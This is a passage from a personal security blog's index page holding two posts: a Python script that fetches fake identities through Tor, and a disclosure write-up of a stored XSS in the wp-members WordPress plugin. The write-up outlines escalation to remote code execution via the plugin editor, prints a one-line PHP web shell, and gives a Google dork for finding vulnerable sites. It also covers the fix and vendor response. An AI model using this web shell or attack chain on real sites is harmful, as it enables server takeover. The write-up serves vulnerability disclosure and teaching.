+    <h2><a href="/create-anonymous-identites-with-fakenamegenerator-com-and-python.html#create-anonymous-identites-with-fakenamegenerator-com-and-python">Create anonymous identites with fakenamegenerator.com and Python</a></h2>
+    <p>
+      Posted on Do 30 Mai 2013 in <a href="/category/programming.html">Programming</a>
+      &#8226; Tagged with
+      <a href="/tag/programming.html">Programming</a>    </p>
+  </header>
+  <div>
+      <h3>Introduction</h3>
+<p>Woah, it has been a hell of a long time since I posted my last
+contribution (I feel like I always begin my blog post with these
+introductory words). However, today I want to show you how to forge
+random identites with a site called
+<a href="http://fakenamegenerator.com">fakenamegenerator.com</a>. I use Python 3
+and a unoffical branch of
+<a href="http://socksipy.sourceforge.net/" title="socksipy">socksipy</a>,  a nice module
+which enables you to tunnel TCP/IP streams through a remote server,
+commonly used to disguise your real IP address. There are three availabe
+modes, SOCKS4, SOCKS5 and HTTP. In this blog post, I use SOCKS5, since I
+install TOR and route my requests through a local proxy sitting on
+127.0.0.1:9050.</p>
+<h3>Why and what</h3>
+<p>The team behind fakenamegenerator.com writes on their site:</p>
+<blockquote>
+<p><em><strong>Name:</strong> Names are generated by randomly pulling a first and a last
+name out of a database. The database was compiled from public domain
+sources. [...]</em></p>
+<p><em><strong>Street address:</strong> The house number is a randomly generated number.
+The street name is pulled from a database of plausible street names
+for the state/country being generated. Odds are that the generated
+street address is not valid.</em></p>
+<p><em><strong>City, state, and postal code:</strong> We have compiled a database
+containing hundreds of thousands of valid city, state, and postal code
+combinations. One of these combinations is randomly pulled from the
+database for each identity.</em></p>
+<p><em><strong>Telephone number:</strong> We have compiled a database of valid area codes
+and prefixes. One of these combinations is randomly pulled from the
+database, and then a random number of the appropriate length is added
+to the end to make the phone number the correct length.</em></p>
+<p><em><strong>Mother's maiden name:</strong> A random name is pulled from our database
+of last names, and listed as the "mother's maiden name".</em></p>
+<p><em><strong>Birthday:</strong> The birthday is a randomly generated date. [...]</em></p>
+</blockquote>
+<p>Furthermore, and here we come to the reason of this blog post:</p>
+<blockquote>
+<p>We <strong>do not</strong> condone, support, or encourage illegal activity of any
+kind. We <strong>will</strong> cooperate with law enforcement organizations to
+assist in the prosecution of anyone that misuses the information we
+provide or that asks us to provide illegal materials, such as forged
+documents or genuine credit card numbers.</p>
+</blockquote>
+<p>I am convinced that they map every identity requested by a client to the
+corresponding IP address. Therefore, the generated identity is not
+anonymous, because your ip address can be mapped to your real identity
+over your internet service provider.</p>
+<h3>Solution</h3>
+<p>That's what I came up with to enforce the retrieval of anonymous
+identites. This is actually the <code>test_function()</code> which calls the function
+<code>scrape_identity()</code> which in turn extracts all the pieces constituting
+the identity from fakenamegenerator.com. You can implement your own
+application logic with <code>scrape_identity()</code>. It just returns a list of
+tuples, whereas each tuple contains the element name (such as 'name',
+'birthdate', 'gender' ...) and the corresponding value.</p>
+<div class="highlight"><pre><span class="k">def</span> <span class="nf">anon_identity</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;This function is a example how to use scrape_identity() anonymously</span>
+<span class="sd">       through TOR. Used like that, you don&#39;t have to worry that your generated</span>
+<span class="sd">       identity is matched to your IP address and therefore to your real identity.</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="c"># Set up a socks socket. You might want to fire up your local TOR PROXY, before</span>
+    <span class="c"># using this function.</span>
+    <span class="c"># Just download TOR here https://www.torproject.org/ and then start tor.</span>
+    <span class="n">socks</span><span class="o">.</span><span class="n">setdefaultproxy</span><span class="p">(</span><span class="n">socks</span><span class="o">.</span><span class="n">PROXY_TYPE_SOCKS5</span><span class="p">,</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9050</span><span class="p">)</span>
+    <span class="n">socks</span><span class="o">.</span><span class="n">wrapmodule</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="p">)</span>
+
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">scrape_identity</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Generated a random and anonymous identity:&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="nb">id</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="s">{0:.&lt;20}{1}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">e</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+</pre></div>
+
+
+<p>You can use my work like this:</p>
+<div class="highlight"><pre><span class="nv">$ </span>git clone https://github.com/NikolaiT/anonymous_identity
+<span class="nv">$ </span><span class="nb">cd </span>anonymous_identity
+<span class="nv">$ </span>python3
+
+Python 3.2.3 <span class="o">(</span>default, Oct <span class="m">19</span> 2012, 19:53:16<span class="o">)</span> 
+<span class="o">[</span>GCC 4.7.2<span class="o">]</span> on linux2
+Type <span class="s2">&quot;help&quot;</span>, <span class="s2">&quot;copyright&quot;</span>, <span class="s2">&quot;credits&quot;</span> or <span class="s2">&quot;license&quot;</span> <span class="k">for</span> more information.
+&gt;&gt;&gt; from identity_generator import anon_identity
+&gt;&gt;&gt; anon_identity<span class="o">()</span>
+<span class="o">[</span>+<span class="o">]</span> Generated a random and anonymous identity:
+    full_name...........Kyle M. Cuevas
+    address.............1136 Ethels Lane
+    phone_number........863-703-6140
+    mother_maiden_name..Powell
+    birthdate...........August 2, 1994
+    blood_group.........A+
+    weight..............70.0 kilograms
+    height..............186 centimeters
+&gt;&gt;&gt;
+</pre></div>
+  </div>
+  <hr />
+</article>
+<article>
+  <header>
+    <h2><a href="/no-1-wp-members-interesting-peristant-xss-leading-to-remote-code-execution.html#no-1-wp-members-interesting-peristant-xss-leading-to-remote-code-execution">No 1. -  wp-members: Interesting peristant XSS leading to remote code execution.</a></h2>
+    <p>
+      Posted on Fr 15 März 2013 in <a href="/category/security.html">Security</a>
+      &#8226; Tagged with
+      <a href="/tag/security.html">Security</a>,      <a href="/tag/programming.html">Programming</a>    </p>
+  </header>
+  <div>
+      <p>Hey you there!</p>
+<p><strong>Type:</strong> Stored cross site scripting<br />
+<strong>Risk:</strong> Medium to high<br />
+<strong>Affecting:</strong> <a href="http://wordpress.org/extend/plugins/wp-members/">http://wordpress.org/extend/plugins/wp-members/</a>
+<strong>Vendor site:</strong> <a href="http://rocketgeek.com">http://rocketgeek.com</a></p>
+<h3>Preface</h3>
+<p>It has been quite some time since I took concern of my blog, although I
+would have had some content ready (maybe even worth) to be published.
+Around six weeks ago, I rummaged (wow - new word!) through endless lines
+of wordpress plugin code, in the hope to get my hands on some low
+hanging fruits (In the likely case you don't have a clue what I am
+talking about: I was searching for easyily detectable security bugs in
+plugin applications written for wordpress). After analysing for several
+hours the architecture and design of a randomly chosen target -
+<a href="http://wordpress.org/extend/plugins/wp-members/">wp-members</a>, a plugin
+providing the site owner with the functionality to password protect
+content on his wordpress site - I was able to detect a pretty nasty bug.</p>
+<h3>The bug</h3>
+<p>Alongside with the access restriction mechanism, the plugin furthermore
+allows users to register. The potential user is presented a nice form,
+which would transfer an array of registration data to the web server
+when submitted. Considering this, there is only one possibile location
+for a sink source and therefore origin of tainted data. The PHP file
+handling the registration logic is not unsurprisingly called
+wp-members-register.php. The vulnerable wp-members version can be found
+<a href="http://downloads.wordpress.org/plugin/wp-members.2.8.0.zip">here</a> (zip
+file of the youngest vulnerable version).</p>
+<p>The herein aforementioned wp-members-register.php-file contains a
+unsound function named <code>wpmem_registration( $toggle )</code> which was
+affected from two kinds of XSS flaws: Reflected and persistent (or
+stored) XSS vulnerability. Whereas the reflected isn't really dangerous
+(modern browsers easily spot them and filter them out by recognizing
+script tags and html entities in the URL), the peristent on the other
+hand might become rather unpleasant.</p>
+<p>This first code snippet shows the preparation of the input and some
+parsing. We learn that the input is written into a two dimensional array
+named <code>$fields</code>.</p>
+<div class="highlight"><pre><span class="x">// build array of the posts</span>
+<span class="x">$wpmem_fields = get_option( &#39;wpmembers_fields&#39; );</span>
+<span class="x">for( $row = 0; $row &lt; count( $wpmem_fields ); $row++ ) {</span>
+<span class="x">    $wpmem_fieldval_arr[$row] = $_POST[$wpmem_fields[$row][2]];</span>
+<span class="x">    // add for _data hooks</span>
+<span class="x">    if( $wpmem_fields[$row][2] != &#39;password&#39; &amp;&amp; $wpmem_fields[$row][4] == &#39;y&#39; ) {</span>
+<span class="x">          $fields[$wpmem_fields[$row][2]] = $wpmem_fieldval_arr[$row];</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>The program logic continues with some checks for obligatory data:</p>
+<div class="highlight"><pre><span class="x">// check for required fields    </span>
+<span class="x">$wpmem_fields_rev = array_reverse( $wpmem_fields );</span>
+<span class="x">$wpmem_fieldval_arr_rev = array_reverse( $wpmem_fieldval_arr );</span>
+
+<span class="x">for( $row = 0; $row &lt; count($wpmem_fields); $row++ ) {</span>
+<span class="x">    $pass_chk = ( $toggle == &#39;update&#39; &amp;&amp; $wpmem_fields_rev[$row][2] == &#39;password&#39; ) ? true : false;</span>
+<span class="x">    if( $wpmem_fields_rev[$row][5] == &#39;y&#39; &amp;&amp; $pass_chk == false ) {</span>
+<span class="x">        if( !$wpmem_fieldval_arr_rev[$row] ) { $wpmem_themsg = sprintf( __(&#39;Sorry, %s is a required field.&#39;, &#39;wp-members&#39;), $wpmem_fields_rev[$row][1] ); }</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>Then, the we find ourselves in a big switch statement which states the
+whole remainder of the function. It basically consists of two cases:
+register and update. Since we are only interested in the register
+functionality, we ingore the update branch.</p>
+<p>Now the coder implements some counter action against injection attacks.
+He checks the supplied username if the corresponding user exists, has
+valid characters and so on. When some of these checks fail, the script
+denies further execution. It makes essentially the same with the
+supplied email address.</p>
+<div class="highlight"><pre><span class="x">if( !$username ) { $wpmem_themsg = __( &#39;Sorry, username is a required field&#39;, &#39;wp-members&#39; ); return $wpmem_themsg; exit(); } </span>
+<span class="x">if( !validate_username( $username ) ) { $wpmem_themsg = __( &#39;The username cannot include non-alphanumeric characters.&#39;, &#39;wp-members&#39; ); return $wpmem_themsg; exit(); }</span>
+<span class="x">if( !is_email( $user_email) ) { $wpmem_themsg = __( &#39;You must enter a valid email address.&#39;, &#39;wp-members&#39; ); return $wpmem_themsg; exit(); }</span>
+<span class="x">if( $wpmem_themsg ) { return &quot;empty&quot;; exit(); }</span>
+<span class="x">if( username_exists( $username ) ) { return &quot;user&quot;; exit(); } </span>
+<span class="x">if( email_exists( $user_email ) ) { return &quot;email&quot;; exit(); }</span>
+</pre></div>
+
+
+<p>At this point, our <code>$fields</code> array is partly sanitized, the rest is still
+populated with arbitrary raw data we are able to control.</p>
+<div class="highlight"><pre>Array
+(
+    [username] =&gt; uuuuuuuu                      SANITIZED
+    [user_email] =&gt; uuuuuuuu@uuuuuuuu.com       SANITIZED
+    [first_name] =&gt; uuuuuuuu
+    [last_name] =&gt; uuuuuuuu
+    [addr1] =&gt; uuuuuuuu
+    [addr2] =&gt; uuuuuuuu
+    [city] =&gt; uuuuuuuu
+    [thestate] =&gt; uuuuuuuu
+    [zip] =&gt; uuuuuuuu
+    [country] =&gt; uuuuuuuu
+    [phone1] =&gt; uuuuuuuu
+)
+</pre></div>
+
+
+<p>We finally come to the first part of the vulnerability. The raw post
+data is inserted into the database through the wordpress API function
+<code>update_user_meta()</code>.</p>
+<div class="highlight"><pre><span class="x">// set remaining fields to wp_usermeta table</span>
+<span class="x">for( $row = 0; $row &lt; count( $wpmem_fields ); $row++ ) {</span>
+<span class="x">    if( $wpmem_fields[$row][2] != &#39;password&#39; ) {</span>
+<span class="x">        if( $wpmem_fields[$row][2] == &#39;user_url&#39; ) { // if the field is user_url, it goes in the wp_users table</span>
+<span class="x">            wp_update_user( array ( &#39;ID&#39; =&gt; $user_id, &#39;user_url&#39; $wpmem_fieldval_arr[$row] ) );</span>
+<span class="x">        } else {</span>
+<span class="x">            if( $wpmem_fields[$row][2] != &#39;user_email&#39; ) { // email is already done above, so if it&#39;s not email...</span>
+<span class="x">                if( $wpmem_fields[$row][4] == &#39;y&#39; ) { // are we using this field?</span>
+<span class="x">                                      update_user_meta( $user_id, $wpmem_fields[$row][2], $wpmem_fieldval_arr[$row] );</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>Unfortunately, these family of wordpress API functions
+(<code>update_user_meta()</code>) don't strip html meta characters (no
+<code>htmlspecialchars()</code> functionality!). Maybe the author assumed that they
+would.</p>
+<p>However, now we know that we can insert arbitrary data (thus also html
+and javascript code) into the database. This is nothing special or even
+insecure yet, because the application could still sanitize the data when
+retrieving it from the database and processing it further. Unfortunately
+this doesn't happen.</p>
+<p>Well. The next idea of mine was too look at the admin panel. I mean,
+this panel may show the tainted user data in a table or something
+similar. And that's what it does:</p>
+<p>An wordpress administrator can access the wordpress plugin wp-members
+over the general admin panel =&gt; Plugins =&gt; Users =&gt; WP-members. Then
+he sees a table overview of all registered users. The corresponding URL
+to obtain this view is
+http://localhost/wp/wp-admin/users.php?page=wpmem-users (<em>localhost/wp</em>
+is my document root in this case...)</p>
+<p>Well, the table consits of 5 columns:</p>
+<div class="highlight"><pre>Username   
+Name    
+E-mail  
+Phone   
+Country
+</pre></div>
+
+
+<p>Remember that our investigations revealed that we are able to insert
+html/javascript into the database for the Name, Phone and Country field?
+Let's check, where this admin panel is made and wheter the data is
+sanitized:</p>
+<p>The view is generated through the function <code>wpmem_admin_users()</code> in the
+/wp-content/plugins/wp-members/user.php file. The actual<br />
+value submitted at registration time is then echoed to the page at line
+261:<br />
+Excerpt:</p>
+<div class="highlight"><pre><span class="x">echo &quot;  ID}&amp;&quot; . esc_attr( stripslashes( $_SERVER[&#39;REQUEST_URI&#39;] ) ) . &quot;\&quot;&gt;&quot; . $user-&gt;user_login . &quot;\n&quot;;</span>
+<span class="x">echo &quot;  \n&quot;;</span>
+<span class="x">echo &quot;  &quot; . get_user_meta( $user-&gt;ID, &#39;first_name&#39;, &#39;true&#39; ) . &quot; &quot; . get_user_meta( $user-&gt;ID, &#39;last_name&#39;, &#39;true&#39; ) . &quot;\n&quot;;</span>
+<span class="x">echo &quot;  &quot; . $user-&gt;user_email . &quot;\n&quot;;</span>
+
+<span class="x">        if( $col_phone == true ) {</span>
+<span class="x">echo &quot;  &quot; . get_user_meta( $user-&gt;ID, &#39;phone1&#39;, &#39;true&#39; ) . &quot;\n&quot;;</span>
+<span class="x">        }</span>
+
+<span class="x">        if( $col_country == true ) {</span>
+<span class="x">echo &quot;  &quot; . get_user_meta( $user-&gt;ID, &#39;country&#39;, &#39;true&#39; ) . &quot;\n&quot;;</span>
+<span class="x">        }</span>
+</pre></div>
+
+
+<p>The value isn't propperly escaped, neither at the time when inserted
+into the database, nor when selected with <code>get_user_meta()</code>. Maybe the
+coder thought that <code>get_user_meta()</code> is XSS safe?!</p>
+<p>The code is only triggered when a user with a field containing the
+exploit code is shown in the admin table. This is normally not the case,
+because there are a vast amount of of users and they are distributed
+over many sites in the panel. Why is that no reduce the threat level of
+the attack vector?<br />
+Users are listed in alphabetical order in the admin panel, according to
+the usernames alphabetical position submitted at registration. So we can
+force with a username like 'aaaaaaaaaaaaaaa' (of course not so
+suspicous) that we are shown (echoed) easily at the first page! This
+means our exploit code is always triggered when the admin access the
+plugin panel, therefore the exploitation chances are pretty good!</p>
+<h3>How would a blackhat design the exploit?</h3>
+<p>The original data shouldn't look suspicous, no suspicion at all should
+be provocated (sneaky stealth mode enabled). The javascript code
+shouldn't take long to execute or alter the front end surface. The code
+must be maximally redundant and should be obfuscated and of course well
+tested!<br />
+Wikipedia says:</p>
+<blockquote>
+<p>The persistent (or stored) XSS vulnerability is a more devastating
+variant of a cross-site scripting flaw: it occurs when the data provided
+by the attacker is saved by the server, and then permanently displayed
+on "normal" pages returned to other users in the course of regular
+browsing, without proper HTML escaping.  </p>
+</blockquote>
+<p>When the payload is triggered, we automatically have the admin cookie.
+So we could steal the cookie and send it to the attackers server to log
+in from there and upload a shell. This is ways too strenuous and
+verbose, so we directly manipulate a existing plugin via the built-in
+plugin-editor of wordpress. The nonce is no further problem, since we
+just know it (XSS eliminates XSRF prevention!) At the exectution time
+the exploit could send a little notification message to our server and
+then that blackhat, knows that his shell is ready for him to access.</p>
+<p>​### How can we find vulnerable sites including the plugin?</p>
+<p>Google dork of wp-members:</p>
+<blockquote>
+<p>This content is restricted to site members.</p>
+</blockquote>
+<p>I recenty published a python script to scan pages with google:
+<a href="http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results">http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results</a><br />
+We could scan pages with the above dork and find lots of sites with the
+installed vulnerable plugin.</p>
+<h3>The consequences</h3>
+<p>On every server where wp-members is installed and when the registration
+is open (which is the normal case, since a sane website never refuses
+users\^\^), a malicious user can register with valid data (to pass
+several registration checks) and the additional exploit code in the
+<em>phone</em> or <em>country</em> field in the registration form.<br />
+Whenever a admin looks at the overview in his admin panel from
+wp-members, the injected code is executed. Because the javascript code
+runs in the context of the admin, the code is absolutely TRUSTED (stored
+XSS):The code can do whatever action the wordpress admin panel provides.
+For example: Change the PHP code of another plugin over the standard
+edit function provided in the wordpress admin panel
+(/wp/wp-admin/plugin-editor.php) to something like</p>
+<div class="highlight"><pre><span class="x">/* Bet you get the idea */</span>
+<span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>and gain a remote shell on the server. This means the server is fully
+compromised (at least http/sql). No need to crack salted md5 hashes,
+like in boring sql injections. Direct RCE.</p>
+<p>The plugin currently has (271,196) downloads (242,142 when I found the
+bug 6 weeks ago), 600 downloads on a daily base. I estimate the number
+of servers who actually installed the plugin at around 30.000 (is this
+actually very modest guessing). Due to the nature of the flaw:<br />
+I guess that a determined blackhat could find 80% of all vulnerable
+servers through spiders. Furthmore, modestly guessing, on 30% of these
+servers the<br />
+exploit would be triggered. This makes: <code>0.8*0.3*30.000 = 7200</code>. After
+adjusting downwards, realisticly 5000 servers could be compromised
+(shell access) within a short period of time (few days to a week).
+These<br />
+servers could act as a neat DOS-Botnet; servers have lot's of
+networking power, don't they?</p>
+<h3>Prevention</h3>
+<p>Sanitizing untrusted data. It's always the same story. Wheter it's a
+command execution, buffer overflows, sqli injections, XSS, there is one
+simple approach to chocke off the root of the problem: Allow only data
+into the application, which compares positvly with a whitelist. This
+sounds easy, indeed it is, but under the financial pressure of greedy
+organizations and general coding stress, security is often ignored and
+missed.</p>
+<p>On the technical side, htmlspecialchars() over the \$fields[] array in
+wp-members-register.php.<br />
+htmlspecialchars() over every data the user is able to manipulate and
+craft!</p>
+<h3>Last words</h3>
+<p>This was only the most gaping flaw, the other became (yeah, they exist)
+rather uninteresting, since I had already a way to get on the server.
+Chad Butler, the author, fixed the bugs very quickly and professionaly.
+He took all my suggestions/concerns very serious and it was generally a
+nice experience working with him!</p>
+  </div>
+</article>
+
+  <div class="pagination">
+    <a class="btn" href="/index6.html">
+      <i class="fa fa-angle-left"></i> Older Posts
+    </a>
+      <a class="btn float-right" href="/index4.html">
+        Newer Posts <i class="fa fa-angle-right"></i>
+      </a>
+  </div>
+
+    <footer>
+      <p>&copy; Nikolai Tschacher 2015</p>
+<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p>    </footer>
+  </main>
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Coding, Learning and IT Security ",
+  "url" : "",
+  "image": "",
+  "description": "Nikolai Tschacher's ideas and programming around security and computer science"
+}
+</script></body>
+</html>
